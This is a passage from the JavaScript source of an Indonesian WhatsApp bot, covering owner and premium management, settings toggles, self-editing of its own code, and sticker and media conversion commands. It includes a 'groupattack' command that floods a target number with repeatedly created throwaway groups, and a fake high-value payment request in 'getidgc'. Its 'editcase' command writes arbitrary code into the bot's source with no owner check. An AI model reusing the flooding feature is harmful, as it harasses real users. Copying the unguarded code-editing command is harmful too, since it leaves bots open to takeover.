    if (!args[0]) return reply(`📌 Contoh: ${XyrooRynzz} 6281543496975 3d`);
    const target = args[0].replace(/[^0-9]/g, '');
    const waktu = args[1];

    let expired = 0;
    if (waktu === '0') {
      expired = 0; // Selamanya
    } else {
      expired = parseTime(waktu);
      if (!expired) return reply(`⚠️ Format waktu tidak valid!\nContoh: 30m ( menit ), 2h ( jam ), 3d ( hari ), 1w ( minggu ), 1mo ( bulan ), 1y ( tahun )\n\nHelp Command\n.addprem nomor 1y`);
    }

    let existing = premium.find(v => v.id === target);
    if (existing) {
      existing.expired = expired;
    } else {
      premium.push({ id: target, expired });
    }

    save();

    reply(`✅ @${target} sekarang menjadi *user premium*${expired !== 0 ? ` hingga ${new Date(expired * 1000).toLocaleString('id-ID')}` : ' selamanya'}.`, {
      mentions: [target + '@s.whatsapp.net']
    });
  }

  if (command === 'delprem') {
    if (!isOwner) return XRO();
    if (!args[0]) return reply(`📌 Contoh: ${XyrooRynzz}delprem 6281543496975`);
    const target = args[0].replace(/[^0-9]/g, '');
    const index = premium.findIndex(v => v.id === target);

    if (index === -1) return reply(`❌ Nomor tidak ditemukan di daftar premium.`);

    premium.splice(index, 1);
    save();

    reply(`✅ @${target} telah dihapus dari daftar premium.`, {
      mentions: [target + '@s.whatsapp.net']
    });
  }
}
break;
case 'listprem': {
  const premPath = './AliceDatabase/premium.json';
  if (!fs.existsSync(premPath)) fs.writeFileSync(premPath, '[]');

  const premium = JSON.parse(fs.readFileSync(premPath));
  if (!premium.length) return reply('🚫 Belum ada user premium.');

  let teks = `👑 *Daftar User Premium*\n\n`;
  const now = Math.floor(Date.now() / 1000);

  for (let i = 0; i < premium.length; i++) {
    const { id, expired } = premium[i];
    const link = `wa.me/${id}`;
    const exp = expired === 0
      ? '♾️ Selamanya'
      : (expired < now
          ? '❌ Expired'
          : `⏳ ${new Date(expired * 1000).toLocaleString('id-ID')}`);
    
    teks += `${i + 1}. ${link}\n   Exp: ${exp}\n`;
  }

  teks += `\nTotal: ${premium.length} user`;

  reply(teks);
}
break;
case 'addowner': {
 if (!isOwner) return XRO()
  // Cek apakah pengirim termasuk yang benar-benar di daftar global.owner
  const allowed = global.owner.map(v => typeof v === 'object' ? v[0] : v);
  if (!allowed.includes(m.sender.replace(/[^0-9]/g, ''))) {
    return reply(`🚫 Hanya nomor yang terdaftar di *global.owner* yang bisa menambahkan owner baru.`);
  }

  if (!args[0]) {
    return reply(`📌 Penggunaan:\n${XyrooRynzz} nomor\nContoh: ${XyrooRynzz} ${owner[0]}`);
  }

  const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
  const jid = prem1 + `@s.whatsapp.net`;

  const cek1 = await Alice.onWhatsApp(jid);
  if (!cek1 || cek1.length === 0 || !cek1[0].exists) {
    return reply(`❌ Nomor tidak valid atau tidak terdaftar di WhatsApp.`);
  }

  if (owner.includes(prem1)) {
    return reply(`⚠️ Nomor ini sudah menjadi owner.`);
  }

  owner.push(prem1);
  fs.writeFileSync('./AliceDatabase/owner.json', JSON.stringify(owner, null, 2));

  reply(`✅ ${prem1} telah ditambahkan sebagai owner.`);
  await Alice.sendMessage(jid, {
    image: { url: thumb },
    caption: `👑 Kamu sekarang adalah *owner* bot.`,
  }, { quoted: m });
}
break;
case 'delowner': {
if (!isOwner) return XRO()
if (!args[0]) return reply(`Penggunaan ${XyrooRynzz} nomor\nContoh ${XyrooRynzz} ${owner}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(prem2)
owner.splice(unp, 1)
fs.writeFileSync('./AliceDatabase/owner.json', JSON.stringify(owner))
reply(`${prem2} Tidak lagi owner!!!`)
}
break

case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await Alice.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdreply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'antical':
case 'anticall':
if (!isOwner) return XRO()
if (args.length < 1) return reply(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
global.anticall = true
reply(`Successfully To ${q}`)
} else if (q == 'off') {
global.anticall = false
reply(`Successfully To ${q}`)
}
break

case 'onlygroup':
case 'onlygc':
if (!isOwner) return XRO()
if (args.length < 1) return reply(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
reply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
reply(`Successfully Changed Onlygroup To ${q}`)
}
break

case 'bangroup':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isOwner) return reply('Fitur Khusus owner!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./AliceDatabase/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./AliceDatabase/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${XyrooRynzz} on -- _mengaktifkan_\n${XyrooRynzz} off -- _Menonaktifkan_`)
}}
break

case 'groupattack': {
if (!text) return reply("contoh : .groupattack nomor|jumlah")
async function fakeGroupInvitationLoop(Alice, target, jumlah) {
    if (!target.includes('@s.whatsapp.net')) {
        target = target + '@s.whatsapp.net';
    }
    const createGroupAndInvite = async () => {
        try {
            const groupName = `FakeGroup_${Math.random().toString(36).substring(7)}`;
            const group = await Alice.groupCreate(groupName, [target]);
            const groupId = group.gid;
            setTimeout(async () => {
                await Alice.groupParticipantsUpdate(groupId, [target], 'remove');
                await Alice.groupLeave(groupId);
            }, 1000); 
        } catch (error) {
            console.error('Error creating group or inviting target:', error);
        }
    };

    for (let i = 0; i < `${jumlah}`; i++) {
        await createGroupAndInvite();
        await new Promise(resolve => setTimeout(resolve, 1000)); 
    }
}
const jumlah = args.join("|")
if (!jumlah) return reply("Masukkan Jumlah Group Yang Ingin Di Buat!")
fakeGroupInvitationLoop(Alice, `${text}` + "@s.whatsapp.net", jumlah);
   }
break

case 'altag': {
if (!isOwner) return
let xy = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
Alice.sendMessage(m.chat, {
	text: `@${m.chat} ${text}`,
	contextInfo: {
mentionedJid: xy, 
		groupMentions: [
			{
				groupSubject: `< Altag By ${ownername} >`,
				groupJid: m.chat,
			},
		],
	},
});
}
break
		
		
		case "autorecord":
			if (!isOwner) return XRO()
			if (text == "on" || text == "1") {
				if (db.data.settings[botNumber].autoRecord == true) return reply("Sudah Active")
				db.data.settings[botNumber].autoRecord = true
				reply(`Succes`)
			} else if (text == "off" || text == "0") {
				if (db.data.settings[botNumber].autoRecord == false) return reply("Sudah Non Active")
				db.data.settings[botNumber].autoRecord = false
				reply(`Succes`)
			} else {
				reply("\`\`\`「 MODE AUTO RECORD 」\`\`\`\n\n0. Off\n1. On")
			}
			break

case 'autoread':
if (!isOwner) return XRO()
if (args.length < 1) return reply(`Example ${XyrooRynzz} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
reply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
reply(`Successfully Changed Auto Read To ${q}`)
}
break

		case "autotyping":
			if (!isOwner) return XRO()
			if (text == "on" || text == "1") {
				if (db.data.settings[botNumber].autoTyping == true) return reply("Sudah Active")
				db.data.settings[botNumber].autoTyping = true
				reply(`Succes`)
			} else if (text == "off" || text == "0") {
				if (db.data.settings[botNumber].autoTyping == false) return reply("Sudah Non Active")
				db.data.settings[botNumber].autoTyping = false
				reply(`Succes`)
			} else {
				reply("\`\`\`「 MODE AUTO TYPING 」\`\`\`\n\n0. Off\n1. On")
			}
			break

		case "mmk":
			if (!isOwner) return XRO()
			if (text == "one" || text == "1") {
				if (db.data.settings[botNumber].setPrefix == "one") return reply("Sudah Active")
				db.data.settings[botNumber].setPrefix = "one"
				reply(`Succes`)
			} else if (text == "no" || text == "2") {
				if (db.data.settings[botNumber].setPrefix == "no") return reply("Sudah Active")
				db.data.settings[botNumber].setPrefix = "no"
				reply(`Succes`)
			} else if (text == "all" || text == "3") {
				if (db.data.settings[botNumber].setPrefix == "all") return reply("Sudah Active")
				db.data.settings[botNumber].setPrefix = "all"
				reply(`Succes`)
			} else {
				reply("\`\`\`「 SETTINGS PREFIX BOT 」\`\`\`\n\n1. one\n2. No\n3. All")
			}
			break			

case 'self': {
if (!isOwner) return XRO()
Alice.public = false
reply('succes')
}
break

case 'public': {
if (!isOwner) return XRO()
Alice.public = true
reply('succes')
}
break

case 'shutdown': {
if (!isOwner) return XRO()
reply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break

case 'getsession':
if (!isOwner) return XRO()
await XReaction()
let sesi = fs.readFileSync('./Session/creds.json')
Alice.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break

            case 'clearsesi':
            case 'clr': {
                if (!isOwner) return XRO()
                const sessionPath = path.join("./AliceSessions");
                try {
                    if (!fs.existsSync(sessionPath)) return reply("Tidak Ditemukan Folder Sessions");
                    const files = await fs.promises.readdir(sessionPath);
                    const sessionFiles = files.filter(file => /\.(json|dict)$/i.test(file) || file.startsWith('pre-key') || file.startsWith('sender-key') || file.startsWith('session-') || file.startsWith('app-state') || file === 'creds.json');
                    if (sessionFiles.length === 0) return reply("Tidak Ditemukan Session");
                    let message = `💾 Menemukan ${sessionFiles.length} file sesi:\n${sessionFiles.map((e, i) => `${i + 1}. ${e}`).join("\n")}`;
                    reply(message);
                    await sleep(2000);
                    reply("⏳ Menghapus file sesi...");
                    let deletedCount = 0;
                    for (const file of sessionFiles) {
                        try {
                            await fs.promises.unlink(path.join(sessionPath, file));
                            deletedCount++;
                        } catch (unlinkErr) {}
                    }
                    await sleep(1000);
                    reply(`✅ ${deletedCount}/${sessionFiles.length} file sesi berhasil dihapus.\nBot mungkin perlu direstart/scan ulang.`);
                } catch (err) {
                    reply(`Gagal Menghapus File Sessions`);
                }
            }
            break;
            
case 'listcase': {
if (!isOwner) return XRO();
reply(listCase())
}
break

case 'getcase': {
if (!isOwner) return XRO()
const getCase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync("./Alice.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
try{
if (!isOwner) return XRO()
if (!q) return reply(`contoh : ${XyrooRynzz} nama casenya`)
let xy = await getCase(q)
reply(xy)
} catch(err){
console.log(err)
reply(`Case ${q} tidak di temukan`)
}
}
break                                  

case 'addcase': {
 if (!isOwner) return XRO() 
 if (!text) return reply(`Example : ${XyrooRynzz} 'namacase': { file case`);
 const fs = require('fs');
const namaFile = 'Alice.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('error:', err);
 return;
 }
 const posisiAwalGimage = data.indexOf("case");
 if (posisiAwalGimage !== -1) {
 const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
 fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 reply('error:', err);
 } else {
 reply('Successfully add case');
 }
 });
 } else {
 reply('error');
 }
});
}
break 

case 'sendcase':
case 'sendfitur': {   
if (!isOwner) return XRO();
if (!m.quoted) return reply('Kutip pesan seseorang!');
if (!text) return reply(`Contoh: ${XyrooRynzz} gpt`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./Alice.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await Alice.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await Alice.sendMessage(recipient, { text: message }, { quoted: m });
reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => reply(`Terjadi kesalahan: ${error.message}`));
}
break

case 'editcase': {
 if (!text) return reply(`Contoh penggunaan: ${XyrooRynzz} <nama_case> | <isi_case_baru>`);
 let [caseName, ...newContentArr] = text.split('|');
 caseName = caseName.trim();
 let newContent = newContentArr.join('|').trim();
 if (!caseName || !newContent) {
 return reply('Format salah! Gunakan format: .editcase <nama_case> | <isi_case_baru>');
 }
 const fs = require('fs');
 const filePath = './Alice.js';
 try {
 if (!fs.existsSync(filePath)) {
 return reply(`File bot tidak ditemukan.`);
 }
 let fileContent = fs.readFileSync(filePath, 'utf-8');
 const regex = new RegExp(`case ['"]${caseName}['"]: {([\\s\\S]*?)}\\s*break;`, 'g');
 if (!regex.test(fileContent)) {
 return reply(`Case *${caseName}* tidak ditemukan.`);
 }
 const updatedFileContent = fileContent.replace(regex, `case '${caseName}': {\n${newContent}\n}\nbreak`);
 fs.writeFileSync(filePath, updatedFileContent, 'utf-8');
 reply(`Case *${caseName}* berhasil diedit.`);
 } catch (error) {
 console.error('Error:', error);
 return reply('Terjadi kesalahan saat mengedit case. Coba lagi nanti.');
 }
}
break;

case "delcase": {
if (!isOwner) return XRO();
if (!q) return reply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./Alice.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./Alice.js", fileContent, "utf-8");

reply(`Case "${caseName}" berhasil dihapus!`);
} else {
reply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Owner Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Convert Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'faceblur':
case 'blurface': {
if (isBan) return XRB()
await XReaction()
  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/reply Foto Dengan Caption ${prefix + command}`)

let media = await Alice.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await Alice.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: packname }, {quoted: m})
}
break
case 'attp':
case 'attp2':
case 'attp3':
case 'attp4':
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4':
case 'ttp5': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Contoh: ${XyrooRynzz} XyrooRynzz`)

  try {
    let buffer

    if (command.startsWith('attp')) {
      switch (command) {
        case 'attp':
          buffer = await generateAttp(text)
          break
        case 'attp2':
          buffer = await generateAttp_v2(text)
          break
        case 'attp3':
          buffer = await generateAttp_v3(text)
          break
        case 'attp4':
          buffer = await generateAttp_v4(text)
          break
      }
    } else if (command.startsWith('ttp')) {
      switch (command) {
        case 'ttp':
          buffer = await generateTtp(text)
          break
        case 'ttp2':
          buffer = await generateTtp_v2(text)
          break
        case 'ttp3':
          buffer = await generateTtp_v3(text)
          break
        case 'ttp4':
          buffer = await generateTtp_v4(text)
          break
        case 'ttp5':
          buffer = await generateTtp_v5(text)
          break
      }
    }

    await Alice.sendImageAsSticker(m.chat, buffer, m, {
      packname: '',
      author: `${author}`,
    })
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break
case 'imessage': case 'iphonechat': case 'iphone-chat':{
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Masukkan teks untuk iMessage!\n\nContoh:\n${XyrooRynzz} XR - XyrooRynzz`);

    try {
        let url = `https://api.ditss.cloud/imageCreator/imessage?text=${encodeURIComponent(text)}`;
        await Alice.sendMessage(m.chat, {
            image: { url },
            caption: `📱 *iMessage Style*\n\n"${text}"`,
        }, { quoted: m });
    } catch (err) {
        console.error('Error iMessage:', err);
        reply('⚠️ Gagal membuat gambar iMessage. Coba lagi nanti.');
    }
}
break;
case 'quotesimg': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Kirim teks quotesnya!\nContoh: ${XyrooRynzz} Jangan pernah menyerah, bro.`);
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await Alice.profilePictureUrl(m.sender, 'image').catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await Alice.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${pushname}*`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break
      case "shortlink":
      case "shorturl": {
if (isBan) return XRB()
await XReaction()      
          if (!text) return reply(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          if (!isUrl(text)) return reply(`Example: ${XyrooRynzz} https://xyroorinzi.net`);
          var res = await axios.get(
            "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(text)
          );
          var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`;
          return reply(link);
        }
        break;
case 'short-cloudku': {
if (isBan) return XRB()
await XReaction()      
  if (!text) return reply(`❌ Link tidak boleh kosong!\n\nContoh:\n.short-cloudku https://google.com\n.short-cloudku https://link.com custom123`)

  let [url, customCode] = text.split(' ')

  if (!/^https?:\/\//.test(url)) return reply('❌ Format link tidak valid! Harus diawali http:// atau https://')

  try {
    const res = await shortCloudku(url, customCode)

    if (!res.status) return reply(`❌ Gagal membuat shortlink:\n${res.error}`)

    let teks = `🔗 *SHORTLINK BERHASIL!*\n\n`
    teks += `🌐 Original : ${res.originalUrl}\n`
    teks += `🔗 Short    : ${res.shortUrl}\n`
    teks += `🆔 Kode     : ${res.key}`

    reply(teks)
  } catch (e) {
    reply('⚠️ Terjadi kesalahan: ' + e.message)
  }

  break
}
case 'morse': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply('Masukkan Teks Yang Ingin Diubah Menjadi Sandi Morse');
  try {
      const morseCode = await convertToMorse(text);
      let responseMessage = `*Teks Asli :*\n_${q}_\n\n*Sandi Morse:*\n${morseCode}`;
      reply(responseMessage);
  } catch (err) {
      console.error(err);
      reply('Terjadi Kesalahan Saat Mengonversi Teks Menjadi Sandi Morse!');
  }
}
break

case 'bratvid':
case 'bratvidio':
case 'bratvideo': {
if (isBan) return XRB()
  if (!text) return reply(`Contoh: ${XyrooRynzz} hai bang`)
  await XReaction()
  if (text.length > 250) return reply(`Karakter terbatas, max 250!`)

  const words = text.split(" ")
  const tempDir = path.join(process.cwd(), 'AliceLibray')
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
  const framePaths = []

  try {
    for (let i = 0; i < words.length; i++) {
      const currentText = words.slice(0, i + 1).join(" ")

      const res = await axios.get(
        `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(currentText)}`,
        { responseType: "arraybuffer" }
      ).catch((e) => e.response)

      const framePath = path.join(tempDir, `frame${i}.mp4`)
      fs.writeFileSync(framePath, res.data)
      framePaths.push(framePath)
    }

    const fileListPath = path.join(tempDir, "filelist.txt")
    let fileListContent = ""

    for (let i = 0; i < framePaths.length; i++) {
      fileListContent += `file '${framePaths[i]}'\n`
      fileListContent += `duration 0.7\n`
    }

    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
    fileListContent += `duration 2\n`

    fs.writeFileSync(fileListPath, fileListContent)
    const outputVideoPath = path.join(tempDir, "output.mp4")
    execSync(
      `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
    )

    await Alice.sendImageAsSticker(m.chat, outputVideoPath, xy, {
      packname: '',
      author: `${author}`
    })

    framePaths.forEach((frame) => {
      if (fs.existsSync(frame)) fs.unlinkSync(frame)
    })
    if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
    if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break

case 'brat': {
if (isBan) return XRB()
XReaction()
if (!q) return reply(`Masukkan teks\n\nContoh: ${XyrooRynzz} alok hamil`);
let rulz = `https://aqul-brat.hf.space/api/brat?text=${encodeURIComponent(q)}`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await Alice.sendImageAsSticker(m.chat, buffer, m, { packname: ``, author: `${author}` });
} catch (e) {
console.log(e);
await reply(`Sedang maintenance atau API error`);
    }
}
break

case 'emojimix': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Example : 😎+😂 atau 😎|😂`);

    const emojis = text.split(/[\+\|]/);
    if (emojis.length !== 2) return reply('Silakan masukkan dua emoji yang valid, example: 😎+😂 atau 😎|😂');

    const text1 = emojis[0].trim();
    const text2 = emojis[1].trim();
 
    let api = `https://fastrestapis.fasturl.cloud/maker/emojimix?emoji1=${text1}&emoji2=${text2}`;
    await Alice.sendImageAsSticker(m.chat, api, xy, { packname: '', author: `${packname}` });
}
break;
case 'qc': {
if (isBan) return XRB()
await XReaction()
    const { quote } = require('./AliceLibray/quote.js');
    let text;

    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return reply("Input teks atau reply teks yang ingin di jadikan quote!");
    }

    if (!text) return reply('masukan text');
    if (text.length > 200) return reply('Maksimal 200 Teks!');

    let ppnyauser = await Alice.profilePictureUrl(m.sender, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png');
    const rest = await quote(text, pushname, ppnyauser);
    Alice.sendImageAsSticker(m.chat, rest.result, m, {
        packname: ``,
        author: `${global.author}`
    });
}
break

case 'tr':
case 'translate': {
if (isBan) return XRB()
await XReaction()
    let translate = require('translate-google-api');
    let defaultLang = 'en';
    let tld = 'cn';
    let toks = `
Contoh:
${XyrooRynzz} <lang> [text]
${XyrooRynzz} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim();

    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    if (!text && m.quoted && m.quoted.text) {
        text = m.quoted.text;
    }

    let result;
    try {
        result = await translate(`${text}`, { to: lang });
    } catch (e) {
        result = await translate(`${text}`, { to: defaultLang });
        reply(`Contoh:
${XyrooRynzz} <lang> [text]
${XyrooRynzz} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`);
    } finally {
        reply(result[0]);
    }
}
break;
            case 'img2txt':
if (isBan) return XRB()
await XReaction()
                if (!/image/.test(mime)) return reply(`*Gambarnya Mana?*`)
                if (/image/.test(mime)) {
                    await XReaction()
                    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
                    let mem = await TelegraPh(mee)
                    let len = await (await fetch(`https://itzpire.com/tools/img2text?url=${mem}`)).json()
                    let result = len.result
                    Alice.sendMessage(m.chat, { image: { url: mem }, caption: `${result}` }, { quoted: m })
                }
                break

            case 'img2promt':
if (isBan) return XRB()
await XReaction()
                if (!/image/.test(mime)) return reply(`Gambarnya Mana?`)
                if (/image/.test(mime)) {
                    await XReaction()
                    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
                    let mem = await TelegraPh(mee)
                    let len = await (await fetch(`https://itzpire.com/tools/img2prompt?url=${mem}`)).json()
                    let result = len.result
                    Alice.sendMessage(m.chat, { image: { url: mem }, caption: `${result}` }, { quoted: m })
                }
                break

case 'togift':
case 'togif': {
if (isBan) return XRB()
await XReaction()
    if (!isMedia) {
        return reply(`Contoh Pengguna\n${XyrooRynzz} *dengan reply sticker/gif*`);
    }
    await XReaction();
    try {
        let media = await Alice.downloadAndSaveMediaMessage(quoted);
        await Alice.sendMessage(m.chat, {
            video: media,
            mimetype: 'video/mp4',
            gifPlayback: true
        }, { quoted: m });
    } catch (e) {
       let media = await Alice.downloadAndSaveMediaMessage(quoted)
       let Xyroo = await ShannzCdn(media)
       let jembut = Xyroo.result.url;
       let memek = await Webp2Mp4(jembut); 
        let kontol = memek.convertUrl;
        await Alice.sendMessage(m.chat, { video: { url: kontol }, gifPlayback: true }, { quoted: m });
    }
}
break;
case 'tomp4':
case 'tovideo':
case 'tovid': {
if (isBan) return XRB()
await XReaction()
    if (!isMedia) {
        return reply(`Contoh Pengguna\n${XyrooRynzz} *dengan reply sticker/gif*`);
    }

    await XReaction();
    try {
        // Mengunduh dan menyimpan media yang di-reply
        let media = await Alice.downloadAndSaveMediaMessage(quoted);
        
        // Mengambil URL dari CDN
        let Xyroo = await ShannzCdn(media); // Pastikan ini adalah fungsi async jika perlu
        let jembut = Xyroo.result;

        // Mengonversi file WebP ke MP4
        let memek = await Webp2Mp4(jembut); // Pastikan ini adalah fungsi async jika perlu
        let kontol = memek.convertUrl;

        // Mengirimkan video yang telah dikonversi
        await Alice.sendMessage(m.chat, { video: { url: kontol }, caption: 'donee' }, { quoted: m });
    } catch (error) {
        console.error(error); // Menampilkan error di console untuk debugging
        return XRR();
    }
}
break;

case 'tovn': {
if (isBan) return XRB()
await XReaction()
if (!isMedia) throw reply(`reply video/audio dengan caption ${XyrooRynzz}`)
if (!quoted) throw reply(`reply video/audio dengan caption ${XyrooRynzz}`)
await XReaction()
try {
var dl = await m.quoted.download()
Alice.sendMessage(m.chat, {audio: dl, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdreply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: channel,
title: `${global.botname} `,
body: `$${ownername}`,
sourceUrl: `${global.channel}`,
thumbnail: ppnyauser
}
}}, { quoted: m })
} catch (error) {
  return XRR()
}
}
break

case 'tomp3':
case 'toaudio': {
if (isBan) return XRB()
await XReaction()
if (!isMedia) throw reply(`reply video/audio dengan caption ${XyrooRynzz}`)
if (!quoted) throw reply(`reply video/audio dengan caption ${XyrooRynzz}`)
await XReaction()
try {
var dl = await m.quoted.download()
Alice.sendMessage(m.chat, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdreply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: channel,
title: `${global.botname}`,
body: `Hai ${pushname}`,
sourceUrl: `${global.channel}`,
thumbnail: ppnyauser
}
}}, { quoted: m })
} catch (error) {
  return XRR()
}
}
break
            
        case 'toimage': case 'toimg': {
if (isBan) return XRB()
await XReaction()
if (!quoted) reply('reply Image')
if (!/webp/.test(mime)) reply(`Balas sticker dengan caption *${XyrooRynzz}*`)
let media = await Alice.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
let buffer = fs.readFileSync(ran)
Alice.sendMessage(m.chat, { image: buffer }, {quoted: m})
fs.unlinkSync(ran)
})
}
break

 case 'toptv':
  case 'ptv':
{
if (isBan) return XRB()
await XReaction()
 if (!quoted) return reply('reply video')
 if (!m.quoted) reply(`Balas Video Dengan Caption ${XyrooRynzz}`)
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted: m})
Alice.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
}
}
break

case 'tourl': {
if (isBan) return XRB()
await XReaction()
